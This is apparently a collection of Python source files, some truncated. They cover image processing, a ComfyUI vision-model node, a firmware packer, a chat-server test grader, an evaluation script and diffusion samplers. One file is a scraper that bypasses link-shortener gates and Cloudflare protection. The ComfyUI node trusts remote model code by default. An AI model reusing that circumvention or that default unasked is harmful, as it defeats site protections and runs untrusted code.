Sobel\u8fb9\u7f18\u56fe\u50cf\r\n    wrinkle_image = np.uint8(gradient_magnitude > 150) * 255\r\n\r\n    # \u5728\u773c\u775b\u4e4b\u5916\u540c\u65f6\u8fdb\u884c\u76b1\u7eb9\u68c0\u6d4b\r\n    wrinkle_image = cv2.bitwise_and(wrinkle_image, wrinkle_region)\r\n\r\n    # \u5bfb\u627e\u68c0\u6d4b\u5230\u7684\u76b1\u7eb9\u533a\u57df\u7684\u8f6e\u5ed3\r\n    contours, _ = cv2.findContours(wrinkle_image, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)\r\n\r\n    # \u5728\u539f\u56fe\u4e0a\u7ed8\u5236\u68c0\u6d4b\u5230\u7684\u76b1\u7eb9\u533a\u57df\r\n    for contour in contours:\r\n        x, y, w, h = cv2.boundingRect(contour)\r\n        # \u5bf9\u76b1\u7eb9\u533a\u57df\u8fdb\u884c\u9ad8\u65af\u6ee4\u6ce2\r\n        cv2.rectangle(gray, (x, y), (x + w, y + h), (0, 255, 0), 2)\r\n        gray[y:y+h, x:x+w] = cv2.GaussianBlur(gray[y:y+h, x:x+w], (15, 15), 0)\r\n\r\n# \u663e\u793a\u7ed3\u679c\u56fe\u50cf\r\ncv2.imshow('image', image_orignal)\r\ncv2.imshow('Wrinkle Detection', gray)\r\ncv2.waitKey(0)\r\ncv2.destroyAllWindows()\r\n\r\n",
    "#\u53c2\u8003 https://github.com/Hangover3832 \u628a\u6a21\u578b\u653e\u5230\u672c\u5730\uff0ccheckponts\u4e0b\u9762\n\nimport os\nfrom transformers import AutoModelForCausalLM, CodeGenTokenizerFast as Tokenizer\nfrom PIL import Image\nimport torch\nimport gc\nimport numpy as np\nimport folder_paths\n\ncomfy_path = os.path.dirname(folder_paths.__file__)\ncustom_nodes_path = os.path.join(comfy_path, \"custom_nodes\")\n\n# \u6307\u5b9a\u672c\u5730\u5206\u5272\u6a21\u578b\u6587\u4ef6\u5939\u7684\u8def\u5f84\nmodel_folder_path = os.path.join(custom_nodes_path,\"Comfyui_CXH_moondream2\",\"checkpoints\",\"moondream2\")\nmodel_name = \"vikhyatk/moondream2\"\n\nclass Moondream:\n    DEVICES = [\"cpu\", \"gpu\"] if torch.cuda.is_available() else  [\"cpu\"]\n\n    def __init__(self):\n        self.model = None\n        self.tokenizer = None\n\n    @classmethod\n    def INPUT_TYPES(s):\n        return {\n            \"required\": {\n                \"image\": (\"IMAGE\",),\n                \"prompt\": (\"STRING\", {\"multiline\": False, \"default\": \"Please provide a detailed description of this image.\"},),\n                \"device\": (s.DEVICES, {\"default\": s.DEVICES[1]},),\n                \"trust_remote_code\": (\"BOOLEAN\", {\"default\": True},),\n                \"cache\": (\"BOOLEAN\", {\"default\": True},),\n            }\n        }\n\n    RETURN_TYPES = (\"STRING\",)\n    RETURN_NAMES = (\"description\",)\n    FUNCTION = \"gen\"\n    OUTPUT_NODE = False\n    CATEGORY = \"CXH\"\n\n    def gen(self, image:torch.Tensor, prompt:str,  device:str, trust_remote_code:bool,cache:bool):\n        dev = \"cuda\" if device.lower() == \"gpu\" else \"cpu\"\n        if (self.model == None) or (self.tokenizer == None)  or (device != self.device):\n            del self.model\n            del self.tokenizer\n            gc.collect()\n            if (device == \"cpu\") and torch.cuda.is_available():\n                torch.cuda.empty_cache()\n            self.model = None\n            self.tokenizer = None\n            try:\n                self.model = AutoModelForCausalLM.from_pretrained(model_name, trust_remote_code=trust_remote_code,cache_dir=model_folder_path).to(dev)\n            except ValueError:\n                print(\"Moondream: You have to trust remote code to use this node!\")\n                return (\"You have to trust remote code execution to use this node!\",)\n            \n            self.tokenizer = Tokenizer.from_pretrained(model_name,cache_dir=model_folder_path)\n            self.device = device\n\n        descriptions = \"\"\n        \n        for im in image:\n            i = 255. * im.cpu().numpy()\n            img = Image.fromarray(np.clip(i, 0, 255).astype(np.uint8))\n            enc_image = self.model.encode_image(img)\n            answer = self.model.answer_question(enc_image, prompt, self.tokenizer)\n            descriptions += answer\n\n        #\u91ca\u653e\u7f13\u5b58\n        if cache == False:\n            del self.model\n            del self.tokenizer\n            self.model = None\n            self.tokenizer = None\n        \n            \n         \n        return(descriptions,)\n",
    "import time\n\n\ndef filter_by_author(quotes, author):\n    \"\"\"\n    Filters quotes by author\n    :param quotes: The list of quotes to be filtered\n    :param author: The inputted author to filter the quotes by\n    :return:\n        - quotes: A list of quotes by the inputted author\n    \"\"\"\n    return [quote for quote in quotes if quote[1].lower() == author.lower()] if author else quotes\n\n\ndef filter_to_daily_quote(quotes):\n    \"\"\"\n    Filters quotes to get a quote based on the current day\n    :param quotes: The list of quotes to be filtered\n    :return:\n        - quotes: The filtered list of quotes with a single quote inside\n    \"\"\"\n    current_day = int(time.time()) / 86400\n    return [quotes[int(current_day) % len(quotes)]]\n\ndef filter_by_excluded_ids(quotes, exclude_indexes):\n    \"\"\"\n    Filters quotes by excluded indexes\n    :param quotes: The list of quotes to be filtered\n    :param exclude_indexes: The original string of numbers to be excluded\n    :return:\n        - quotes: The filtered list of quotes with a single quote inside\n    \"\"\"\n    exclude_indexes = [int(index) for index in exclude_indexes.split(\",\") if index.strip()]\n    return [quote for quote in quotes if quote[2] not in exclude_indexes]\n\n\ndef get_specific_quote(quotes, specific_quote):\n    \"\"\"\n    Filters quotes to get a specific quote\n    :param quotes: The list of quotes to be filtered\n    :param specific_quote: The specific quote to be filtered\n    :return:\n        - quotes: The filtered list of quotes with a single quote inside\n    \"\"\"\n    return [quote for quote in quotes if quote[0][:len(specific_quote)].lower() == specific_quote.lower()]\n\n\ndef get_quote_by_index(quotes, specific_quote_index):\n    \"\"\"\n    Filters quotes to get a specific quote by index\n    :param quotes: The list of quotes to be filtered\n    :param specific_quote_index: The index of the specific quote to be filtered\n    :return:\n        - quotes: The filtered list of quotes with a single quote inside\n    \"\"\"\n    return [quote for quote in quotes if quote[2] == specific_quote_index]\n",
    "#!/usr/bin/env python3\n\"\"\"\nfwpack - Pack/Unpack DRC/DRH firmware files\nCreated in 2024 by GaryOderNichts\n<https://github.com/GaryOderNichts/drc-fw-patches>\n\nCredits to drxtool for the firmware header logic and extracted files structure.\n\"\"\"\n\nimport sys, os\nimport binascii\nimport construct\n\nclass FirmwareType:\n    FIRMWARE_TYPE_DRC = 0x01010000\n    FIRMWARE_TYPE_DRH = 0x00010000\n\nBlobHeader = construct.Struct(\n    \"imageVersion\" / construct.Int32ub,\n    \"blockSize\" / construct.Int32ub,\n    \"sequencePerSession\" / construct.Int32ub,\n    \"imageSize\" / construct.Int32ub,\n)\nassert(BlobHeader.sizeof() == 0x10)\n\nFirmwareHeader = construct.Struct(\n    \"type\" / construct.Int32ul,\n    \"superCRCs\" / construct.Array(4, construct.Int32ul),\n    construct.Padding(0xFE8),\n    \"headerCRC\" / construct.Int32ul,\n    \"subCRCs\" / construct.Array(0x1000, construct.Int32ul),\n)\nassert(FirmwareHeader.sizeof() == 0x5000)\n\nFirmwareSection = construct.Struct(\n    \"offset\" / construct.Int32ul,\n    \"size\" / construct.Int32ul,\n    \"name\" / construct.PaddedString(4, \"ascii\"),\n    \"version\" / construct.Int32ul,\n)\nassert(FirmwareSection.sizeof() == 0x10)\n\nFirmwareFile = construct.Struct(\n    \"blobHeader\" / BlobHeader,\n    \"firmwareHeader\" / FirmwareHeader,\n    \"firmwareData\" / construct.Bytes(construct.this.blobHeader.imageSize - FirmwareHeader.sizeof()),\n)\n\n# Thanks to drxtool for the crctable logic\ndef verify_firmware_header(fw) -> bool:\n    # Verify header CRC\n    header_crc = binascii.crc32(FirmwareHeader.build(fw.firmwareHeader)[0:0xFFC])\n    if header_crc != fw.firmwareHeader.headerCRC:\n        return False\n    \n    # Verify super crcs\n    subcrc_data = construct.Array(0x1000, construct.Int32ul).build(fw.firmwareHeader.subCRCs)\n    for i in range(4):\n        super_crc = binascii.crc32(subcrc_data[i*0x1000:i*0x1000+0x1000])\n        if super_crc != fw.firmwareHeader.superCRCs[i]:\n            return False\n\n    # Verify sub crcs\n    for i in range(len(fw.firmwareData) // 0x1000 + 1):\n        offset = i * 0x1000\n        length = 0x1000\n        if len(fw.firmwareData) - offset < length:\n            length = len(fw.firmwareData) - offset\n\n        sub_crc = binascii.crc32(fw.firmwareData[offset:offset + length])\n        if sub_crc != fw.firmwareHeader.subCRCs[i]:\n            return False\n\n    return True\n\ndef build_firmware_header(blob_type, firmware_data) -> dict:\n    # Calculate CRC for every 0x1000 bytes of firmware data\n    sub_crcs = [0] * 0x1000\n    for i in range(len(firmware_data) // 0x1000 + 1):\n        offset = i * 0x1000\n        length = 0x1000\n        if len(firmware_data) - offset < length:\n            length = len(firmware_data) - offset\n\n        sub_crcs[i] = binascii.crc32(firmware_data[offset:offset + length])\n\n    # Calculate the super CRCs\n    super_crcs = [0] * 4\n    subcrc_data = construct.Array(0x1000, construct.Int32ul).build(sub_crcs)\n    for i in range(4):\n        super_crcs[i] = binascii.crc32(subcrc_data[i*0x1000:i*0x1000+0x1000])\n\n    firmware_header = dict(type=blob_type, superCRCs=super_crcs, headerCRC=0, subCRCs=sub_crcs)\n\n    # Calculate the header CRC\n    firmware_header[\"headerCRC\"] = binascii.crc32(FirmwareHeader.build(firmware_header)[0:0xFFC])\n\n    return firmware_header\n\ndef unpack_firmware(source_file, dest_dir):\n    fw = FirmwareFile.parse_file(source_file)\n    if not verify_firmware_header(fw):\n        print(\"Firmware header verification failed\")\n        sys.exit(1)\n\n    if fw.firmwareHeader.type == FirmwareType.FIRMWARE_TYPE_DRC:\n        print(f\"DRC firmware version 0x{fw.blobHeader.imageVersion:08x}\")\n    elif fw.firmwareHeader.type == FirmwareType.FIRMWARE_TYPE_DRH:\n        print(f\"DRH firmware version 0x{fw.blobHeader.imageVersion:08x}\")\n    else:\n        print(f\"Unsupported firmware type 0x{fw.firmwareHeader.type:08x}\")\n        sys.exit(1)\n\n    if not os.path.isdir(dest_dir):\n        os.mkdir(dest_dir)\n\n    # Write blob header and type\n    BlobHeader.build_file(fw.blobHeader, os.path.join(dest_dir, \"blob_header.bin\"))\n    construct.Int32ul.build_file(fw.firmwareHeader.type, os.path.join(dest_dir, \"blob_type.bin\"))\n\n    # Assume first part of the data is the index\n    index = FirmwareSection.parse(fw.firmwareData)\n\n    # Parse sections\n    sections = construct.Array(index.size // FirmwareSection.sizeof(), FirmwareSection).parse(fw.firmwareData)\n    for s in sections:\n        print(f\"Saving {s.name} version 0x{s.version:08x} offset 0x{s.offset} size 0x{s.size}\")\n\n        # write section to file\n        with open(os.path.join(dest_dir, s.name + \".bin\"), \"wb\") as f:\n            f.write(fw.firmwareData[s.offset:s.offset + s.size])\n\ndef pack_firmware(source_dir, dest_file):\n    # Read blob header and type\n    blob_header = BlobHeader.parse_file(os.path.join(source_dir, \"blob_header.bin\"))\n    blob_type = construct.Int32ul.parse_file(os.path.join(source_dir, \"blob_type.bin\"))\n\n    # Parse sections from INDX\n    firmware_data = b\"\"\n    sections = construct.GreedyRange(FirmwareSection).parse_file(os.path.joi",
    "import re\r\nimport requests\r\nfrom curl_cffi import requests as Nreq\r\nimport base64\r\nfrom urllib.parse import unquote, urlparse, quote\r\nimport time\r\nimport cloudscraper\r\nfrom bs4 import BeautifulSoup, NavigableString, Tag\r\nfrom lxml import etree\r\nimport hashlib\r\nimport json\r\nfrom asyncio import sleep as asleep\r\nimport ddl\r\nfrom cfscrape import create_scraper\r\nfrom json import load\r\nfrom os import environ\r\n\r\nwith open('config.json', 'r') as f: DATA = load(f)\r\ndef getenv(var): return environ.get(var) or DATA.get(var, None)\r\n\r\n\r\n##########################################################\r\n# ENVs\r\n\r\nGDTot_Crypt = getenv(\"CRYPT\")\r\nLaravel_Session = getenv(\"Laravel_Session\")\r\nXSRF_TOKEN = getenv(\"XSRF_TOKEN\")\r\nDCRYPT = getenv(\"DRIVEFIRE_CRYPT\")\r\nKCRYPT = getenv(\"KOLOP_CRYPT\")\r\nHCRYPT = getenv(\"HUBDRIVE_CRYPT\")\r\nKATCRYPT = getenv(\"KATDRIVE_CRYPT\")\r\nCF = getenv(\"CLOUDFLARE\")\r\n\r\n############################################################\r\n# Lists\r\n\r\notherslist = [\"exe.io\",\"exey.io\",\"sub2unlock.net\",\"sub2unlock.com\",\"rekonise.com\",\"letsboost.net\",\"ph.apps2app.com\",\"mboost.me\",\r\n\"sub4unlock.com\",\"ytsubme.com\",\"social-unlock.com\",\"boost.ink\",\"goo.gl\",\"shrto.ml\",\"t.co\"]\r\n\r\ngdlist = [\"appdrive\",\"driveapp\",\"drivehub\",\"gdflix\",\"drivesharer\",\"drivebit\",\"drivelinks\",\"driveace\",\r\n\"drivepro\",\"driveseed\"]\r\n\r\n\r\n###############################################################\r\n# pdisk\r\n\r\ndef pdisk(url):\r\n    r = requests.get(url).text\r\n    try: return r.split(\"<!-- \")[-1].split(\" -->\")[0]\r\n    except:\r\n        try:return BeautifulSoup(r,\"html.parser\").find('video').find(\"source\").get(\"src\")\r\n        except: return None\r\n\r\n###############################################################\r\n# index scrapper\r\n\r\ndef scrapeIndex(url, username=\"none\", password=\"none\"):\r\n\r\n    def authorization_token(username, password):\r\n        user_pass = f\"{username}:{password}\"\r\n        return f\"Basic {base64.b64encode(user_pass.encode()).decode()}\"\r\n\r\n          \r\n    def decrypt(string): \r\n        return base64.b64decode(string[::-1][24:-20]).decode('utf-8')  \r\n\r\n    \r\n    def func(payload_input, url, username, password): \r\n        next_page = False\r\n        next_page_token = \"\" \r\n\r\n        url = f\"{url}/\" if url[-1] != '/' else url\r\n\r\n        try: headers = {\"authorization\":authorization_token(username,password)}\r\n        except: return \"username/password combination is wrong\", None, None\r\n\r\n        encrypted_response = requests.post(url, data=payload_input, headers=headers)\r\n        if encrypted_response.status_code == 401: return \"username/password combination is wrong\", None, None\r\n\r\n        try: decrypted_response = json.loads(decrypt(encrypted_response.text))\r\n        except: return \"something went wrong. check index link/username/password field again\", None, None\r\n\r\n        page_token = decrypted_response[\"nextPageToken\"]\r\n        if page_token is None: \r\n            next_page = False\r\n        else: \r\n            next_page = True \r\n            next_page_token = page_token \r\n\r\n\r\n        if list(decrypted_response.get(\"data\").keys())[0] != \"error\":\r\n            file_length = len(decrypted_response[\"data\"][\"files\"])\r\n            result = \"\"\r\n\r\n            for i, _ in enumerate(range(file_length)):\r\n                files_type   = decrypted_response[\"data\"][\"files\"][i][\"mimeType\"]\r\n                if files_type != \"application/vnd.google-apps.folder\":\r\n                        files_name   = decrypted_response[\"data\"][\"files\"][i][\"name\"] \r\n\r\n                        direct_download_link = url + quote(files_name)\r\n                        result += f\"\u2022 {files_name} :\\n{direct_download_link}\\n\\n\"\r\n            return result, next_page, next_page_token\r\n\r\n    def format(result):\r\n        long_string = ''.join(result)\r\n        new_list = []\r\n\r\n        while len(long_string) > 0:\r\n            if len(long_string) > 4000:\r\n                split_index = long_string.rfind(\"\\n\\n\", 0, 4000)\r\n                if split_index == -1:\r\n                    split_index = 4000\r\n            else:\r\n                split_index = len(long_string)\r\n                \r\n            new_list.append(long_string[:split_index])\r\n            long_string = long_string[split_index:].lstrip(\"\\n\\n\")\r\n        \r\n        return new_list\r\n\r\n    # main\r\n    x = 0\r\n    next_page = False\r\n    next_page_token = \"\" \r\n    result = []\r\n\r\n    payload = {\"page_token\":next_page_token, \"page_index\": x}\t\r\n    print(f\"Index Link: {url}\\n\")\r\n    temp, next_page, next_page_token = func(payload, url, username, password)\r\n    if temp is not None: result.append(temp)\r\n    \r\n    while next_page == True:\r\n        payload = {\"page_token\":next_page_token, \"page_index\": x}\r\n        temp, next_page, next_page_token = func(payload, url, username, password)\r\n        if temp is not None: result.append(temp)\r\n        x += 1\r\n        \r\n    if len(result)==0: return None\r\n    return format(result)\r\n\r\n################################################################\r\n# Shortner Full Page API\r\n\r\ndef shortner_fpage_api(link):\r\n  ",
    "import pexpect\nimport os\nimport argparse\nimport json\nimport random\nimport string\nfrom pexpect.exceptions import TIMEOUT as TimeoutException, EOF as EndOfFileException\nimport time\n\nCLIENT_FOLDER_PATH = './'\nADDRESS = \"127.0.0.1\"\nPORT = 5378\nSTUDENT_FILE_PATH = \"../student/server_check/server.py\"\n\ndef generate_name():\n    return ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(8, 16)))\n\ndef generate_message(min_len=32, max_len=64):\n    return ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(min_len, max_len)))\n\nclass TestException(Exception):\n    pass\n\ndef handle_pexpect(child_process, processes_to_terminate, expect_string, output_buffer, step, timeout=1):\n    try:\n        child_process.expect(expect_string, timeout=timeout)\n        output_buffer += child_process.before + child_process.after\n\n    except TimeoutException:\n        output_buffer += child_process.before\n        last_printed_line = '[EMPTY LINE. PROGRAM DID NOT PRODUCE ANY OUTPUT]'\n        lines = output_buffer.split('\\n')\n\n        for line in reversed(lines):\n            if line.strip():\n                last_printed_line = line\n                break\n\n        for process in processes_to_terminate:\n            process.terminate(force=True)\n\n        raise TestException(f'unexpected client output at the step {step}!\\nExpected output:\\n\\n{expect_string}\\n\\nActual output (the last printed line): \\n\\n{last_printed_line}\\n\\nTotal program output:\\n\\n{output_buffer}')\n    except EndOfFileException:\n        output_buffer += child_process.before + child_process.after\n\n        for process in processes_to_terminate:\n            process.terminate(force=True)\n            \n        raise TestException(f'program has unexpectidly terminated at step {step}!\\nExpected output:\\n\\n{expect_string}\\n\\nProgram\\'s last printed line: \\n\\n{last_printed_line}\\n\\nTotal program output:\\n\\n{output_buffer}')\n    \n    return output_buffer\n\ndef start_server():\n    server_process = execute_and_detach(f'python3 {STUDENT_FILE_PATH} --address \"{ADDRESS}\" --port {PORT}')\n    expected_output = \"Server is on\"\n\n    output_buffer = handle_pexpect(server_process, [server_process], expected_output, \"\", \"starting a server\")\n        \n    return server_process, output_buffer\n\n\ndef execute_and_wait(cmd):\n    process = pexpect.spawn('/bin/sh', ['-c', cmd], encoding='utf-8')\n    process.expect(pexpect.EOF)\n    output = process.before  # Capture the output\n    process.wait()\n\n    return process.exitstatus, output\n\ndef execute_and_collect_output(cmd):\n    child = pexpect.spawn(cmd, encoding='utf-8')\n    while True:\n        try:\n            line = child.readline()\n            if not line:\n                break\n            yield line\n        except pexpect.EOF:\n            break\n\ndef execute_and_detach(cmd):\n    child = pexpect.spawn(cmd, encoding='utf-8')\n    return child\n    \n\ndef start_script():\n    expected_output = 'Welcome to Chat Client. Enter your login:'\n\n    current_dir = os.getcwd()\n    os.chdir(CLIENT_FOLDER_PATH)\n\n    client_process = pexpect.spawn(f'java -jar ChatClient.jar', encoding='utf-8')\n\n    os.chdir(current_dir)\n\n    output_buffer = handle_pexpect(client_process, [client_process], expected_output, \"\", \"starting a client\")\n\n    return client_process, output_buffer\n\ndef log_in(client_name=\"client\"):\n    expected_output = f'Succesfully logged in as {client_name}!'\n\n    client_process, output_buffer = start_script()\n    client_process.sendline(client_name)\n\n    output_buffer = handle_pexpect(client_process, [client_process], expected_output, output_buffer, \"logging in with a client\")\n\n    return client_process, output_buffer\n\ndef reject_usernames_commas():\n    client_name_pt1 = generate_name()\n    client_name_pt2 = generate_name()\n    \n    expected_output = \"BAD-RQST-BODY\"\n    _, output = execute_and_wait(f'echo \"HELLO-FROM {client_name_pt1},{client_name_pt2}\" | nc 127.0.0.1 5378 -W 1')\n    \n    if not expected_output in output:\n        raise TestException(f\"your sever did not return BAD-RQST-BODY when logging in with a username that contains commas. Reply was '{output}'\")\n\n    return output\n\ndef reject_usernames_spaces():\n    client_name_pt1 = generate_name()\n    client_name_pt2 = generate_name()\n    \n    expected_output = \"BAD-RQST-BODY\"\n    _, output = execute_and_wait(f'echo \"HELLO-FROM {client_name_pt1} {client_name_pt2}\" | nc 127.0.0.1 5378 -W 1')\n    \n    if not expected_output in output:\n        raise TestException(f\"your sever did not return BAD-RQST-BODY when logging in with a username that contains spaces. Reply was '{output}'\")\n\n    return output\n\ndef test_16_clients():\n    MAX_CLIENTS = 16\n    client_nameS = [generate_name() for _ in range(MAX_CLIENTS)]\n\n    [log_in(f'{client_nameS[i]}') for i in range(0, 16)]\n\ndef test_busy():\n    MAX_CLIENTS = 16\n\n    client_names = [generate_name() for _ in range(MAX_CLIENTS)]\n    logged_processes = [log_in(f'{client_names[i]}') for i in range(0, 16)]\n\n    client_name = generate_name()\n ",
    "from easy_io import dump_json, read_jsonl\nimport numpy as np\nfrom sklearn.metrics import confusion_matrix, precision_recall_fscore_support\n\nfrom src.path import annotated_dataset_dir, baseline_performance_dir\nfrom src.config import new_datasets_names, new_datasets_initial_models, baseline_models_closed, baseline_models_open, convert_category_name_dict\nfrom src.baseline.prompt import simple_prompt_baseline_prompts_dict\nfrom src.baseline.simple_prompt_baseline import get_baseline_output_dir\n\n\ndef get_performance(dataset: list[dict], predictions: list[dict]) -> dict:\n    \"\"\"Calculate performance of error detection.\n    Args:\n        dataset: list of annotations.\n        predictions: list of predictions. Each element of the list is a dict with keys \"metadata\" and \"prediction\".\n    \"\"\"\n    \n    if len(dataset) != len(predictions):\n        return {}\n    \n    assert all([d[\"metadata\"][\"id\"] == r[\"metadata\"][\"id\"] for d, r in zip(dataset, predictions)])\n    \n    prediction_error_num = sum([1 for p in predictions if p[\"prediction\"] == \"error\"])\n    gold_error_num = sum([1 for d in dataset if d[\"error_label\"] == \"error\"])\n\n    y_true = [1 if d[\"error_label\"] == \"error\" else 0 for d in dataset]\n    y_pred = [1 if p[\"prediction\"] == \"error\" else 0 for p in predictions]\n\n    # accuracy\n    correct = sum([1 for d, p in zip(dataset, predictions) if p[\"prediction\"] == d[\"error_label\"]])\n    total = len(predictions)\n    accuracy = correct / total\n    \n    # f1\n    precision, recall, f1, _ = precision_recall_fscore_support(y_true, y_pred, average=\"binary\", zero_division=0)\n    \n    # confusion matrix (error = positive) \n    tn, fp, fn, tp = confusion_matrix(y_true, y_pred, labels=[0, 1]).ravel() / total\n    \n    return {\n        \"total_num\": total,\n        \"prediction_error_num\": prediction_error_num,\n        \"gold_error_num\": gold_error_num,\n        \"metrics\": {\n            \"accuracy\": accuracy,\n            \"precision\": precision,\n            \"recall\": recall,\n            \"f1\": f1,\n            \"true_negative_rate\": tn,\n            \"false_positive_rate\": fp,\n            \"false_negative_rate\": fn,\n            \"true_positive_rate\": tp,\n        }\n    }\n\n\ndef get_average_of_list_of_dict(list_of_dict: list[dict]) -> dict:\n    average_dict = {}\n\n    if len(list_of_dict) == 0:\n        return average_dict\n    \n    for key in list_of_dict[0].keys():\n        list_of_value = [d[key] for d in list_of_dict]\n        \n        average_dict[key] = {\n            \"average\": np.mean(list_of_value).item(),\n            \"stdev\": np.std(list_of_value).item(),\n        }\n    return average_dict\n\n\ndef get_average_performance(performance_dict: dict) -> dict:\n    # check\n    for value in performance_dict.values():\n        if len(value) == 0:\n            return {}    \n    \n    average_performance = {}\n    first_key = list(performance_dict.keys())[0]\n    for key in [\"total_num\", \"gold_error_num\"]:\n        average_performance[key] = performance_dict[first_key][key]\n\n    # calculate average\n    list_of_dict = [performance_dict[key][\"metrics\"] for key in performance_dict.keys()]\n    average_performance[\"metrics\"] = get_average_of_list_of_dict(list_of_dict)\n    \n    return average_performance\n\n\ndataset_to_categories = {\n    \"math_word_problem_generation\": [\"reasoning\", \"constraints\"],\n    \"finegrained_fact_verification\": [\"reasoning\", \"constraints\", \"context\"],\n    \"answerability_classification\": [\"reasoning\", \"knowledge\"],\n}\n\n\nif __name__ == \"__main__\":\n    baseline_performance_dir.mkdir(parents=True, exist_ok=True)\n    \n    for baseline_name in [\"simple_prompt_baseline\", \"advanced_prompt_baseline\", \"majority_vote\", \"self_consistency\"]:\n        print(baseline_name)\n        \n        # config\n        initial_models_list = [\"gpt-4-0613\"] if baseline_name == \"self_consistency\" else new_datasets_initial_models\n        \n        baseline_models_list = {\n            \"simple_prompt_baseline\": baseline_models_open + baseline_models_closed,\n            \"advanced_prompt_baseline\": baseline_models_open + baseline_models_closed,\n            \"majority_vote\": [\"Llama-2-70b-chat-hf__Mixtral-8x7B-Instruct-v0.1__Qwen1.5-72B-Chat\"],\n            \"self_consistency\": [\"mistralai/Mixtral-8x7B-Instruct-v0.1\", \"gpt-3.5-turbo-0125\", \"gpt-4-0125-preview\"]\n        }[baseline_name]\n        \n        prompts_list = {\n            \"simple_prompt_baseline\": list(simple_prompt_baseline_prompts_dict.keys()),\n            \"advanced_prompt_baseline\": [\"cot_instruction_prompt\"],\n            \"majority_vote\": [\"majority_vote\"],\n            \"self_consistency\": [\"baseline_errordetection_prompt_1\"]\n        }[baseline_name]\n        \n        # calculate performance        \n        performance_dict: dict[str, dict[str, dict[str, float]]] = {}\n        category_performance_dict: dict[str, dict[str, dict[str, dict[str, dict[str, float]]]]] = {}\n        for dataset_name in new_datasets_names:\n            print(dataset_name)\n            \n            for initial_model in initial_models_list:\n                init",
    "import torch\r\nimport inspect\r\nimport k_diffusion.sampling\r\nfrom modules import sd_samplers_common, sd_samplers_extra, sd_samplers_cfg_denoiser\r\nfrom modules.sd_samplers_cfg_denoiser import CFGDenoiser  # noqa: F401\r\nfrom modules.script_callbacks import ExtraNoiseParams, extra_noise_callback\r\n\r\nfrom modules.shared import opts\r\nimport modules.shared as shared\r\n\r\nsamplers_k_diffusion = [\r\n    ('DPM++ 2M Karras', 'sample_dpmpp_2m', ['k_dpmpp_2m_ka'], {'scheduler': 'karras'}),\r\n    ('DPM++ SDE Karras', 'sample_dpmpp_sde', ['k_dpmpp_sde_ka'], {'scheduler': 'karras', \"second_order\": True, \"brownian_noise\": True}),\r\n    ('DPM++ 2M SDE Exponential', 'sample_dpmpp_2m_sde', ['k_dpmpp_2m_sde_exp'], {'scheduler': 'exponential', \"brownian_noise\": True}),\r\n    ('DPM++ 2M SDE Karras', 'sample_dpmpp_2m_sde', ['k_dpmpp_2m_sde_ka'], {'scheduler': 'karras', \"brownian_noise\": True}),\r\n    ('Euler a', 'sample_euler_ancestral', ['k_euler_a', 'k_euler_ancestral'], {\"uses_ensd\": True}),\r\n    ('Euler', 'sample_euler', ['k_euler'], {}),\r\n    ('Euler Max', 'sample_euler_max', ['k_euler'], {}),\r\n    ('Euler Dy', 'sample_euler_dy', ['k_euler'], {}),\r\n    ('Euler Dy Avg', 'sample_euler_dy_avg', ['k_euler'], {}),\r\n    ('Euler Dy2', 'sample_euler_dy2', ['k_euler'], {}),\r\n    ('Euler Dyn', 'sample_euler_dyn', ['k_euler'], {}),\r\n    ('LMS', 'sample_lms', ['k_lms'], {}),\r\n    ('Heun', 'sample_heun', ['k_heun'], {\"second_order\": True}),\r\n    ('DPM2', 'sample_dpm_2', ['k_dpm_2'], {'discard_next_to_last_sigma': True, \"second_order\": True}),\r\n    ('DPM2 a', 'sample_dpm_2_ancestral', ['k_dpm_2_a'], {'discard_next_to_last_sigma': True, \"uses_ensd\": True, \"second_order\": True}),\r\n    ('DPM++ 2S a', 'sample_dpmpp_2s_ancestral', ['k_dpmpp_2s_a'], {\"uses_ensd\": True, \"second_order\": True}),\r\n    ('DPM++ 2M', 'sample_dpmpp_2m', ['k_dpmpp_2m'], {}),\r\n    ('DPM++ SDE', 'sample_dpmpp_sde', ['k_dpmpp_sde'], {\"second_order\": True, \"brownian_noise\": True}),\r\n    ('DPM++ 2M SDE', 'sample_dpmpp_2m_sde', ['k_dpmpp_2m_sde_ka'], {\"brownian_noise\": True}),\r\n    ('DPM++ 2M SDE Heun', 'sample_dpmpp_2m_sde', ['k_dpmpp_2m_sde_heun'], {\"brownian_noise\": True, \"solver_type\": \"heun\"}),\r\n    ('DPM++ 2M SDE Heun Karras', 'sample_dpmpp_2m_sde', ['k_dpmpp_2m_sde_heun_ka'], {'scheduler': 'karras', \"brownian_noise\": True, \"solver_type\": \"heun\"}),\r\n    ('DPM++ 2M SDE Heun Exponential', 'sample_dpmpp_2m_sde', ['k_dpmpp_2m_sde_heun_exp'], {'scheduler': 'exponential', \"brownian_noise\": True, \"solver_type\": \"heun\"}),\r\n    ('DPM++ 3M SDE', 'sample_dpmpp_3m_sde', ['k_dpmpp_3m_sde'], {'discard_next_to_last_sigma': True, \"brownian_noise\": True}),\r\n    ('DPM++ 3M SDE Karras', 'sample_dpmpp_3m_sde', ['k_dpmpp_3m_sde_ka'], {'scheduler': 'karras', 'discard_next_to_last_sigma': True, \"brownian_noise\": True}),\r\n    ('DPM++ 3M SDE Exponential', 'sample_dpmpp_3m_sde', ['k_dpmpp_3m_sde_exp'], {'scheduler': 'exponential', 'discard_next_to_last_sigma': True, \"brownian_noise\": True}),\r\n    ('DPM fast', 'sample_dpm_fast', ['k_dpm_fast'], {\"uses_ensd\": True}),\r\n    ('DPM adaptive', 'sample_dpm_adaptive', ['k_dpm_ad'], {\"uses_ensd\": True}),\r\n    ('LMS Karras', 'sample_lms', ['k_lms_ka'], {'scheduler': 'karras'}),\r\n    ('DPM2 Karras', 'sample_dpm_2', ['k_dpm_2_ka'], {'scheduler': 'karras', 'discard_next_to_last_sigma': True, \"uses_ensd\": True, \"second_order\": True}),\r\n    ('DPM2 a Karras', 'sample_dpm_2_ancestral', ['k_dpm_2_a_ka'], {'scheduler': 'karras', 'discard_next_to_last_sigma': True, \"uses_ensd\": True, \"second_order\": True}),\r\n    ('DPM++ 2S a Karras', 'sample_dpmpp_2s_ancestral', ['k_dpmpp_2s_a_ka'], {'scheduler': 'karras', \"uses_ensd\": True, \"second_order\": True}),\r\n    ('Restart', sd_samplers_extra.restart_sampler, ['restart'], {'scheduler': 'karras', \"second_order\": True}),\r\n]\r\n\r\n\r\nsamplers_data_k_diffusion = [\r\n    sd_samplers_common.SamplerData(label, lambda model, funcname=funcname: KDiffusionSampler(funcname, model), aliases, options)\r\n    for label, funcname, aliases, options in samplers_k_diffusion\r\n    if callable(funcname) or 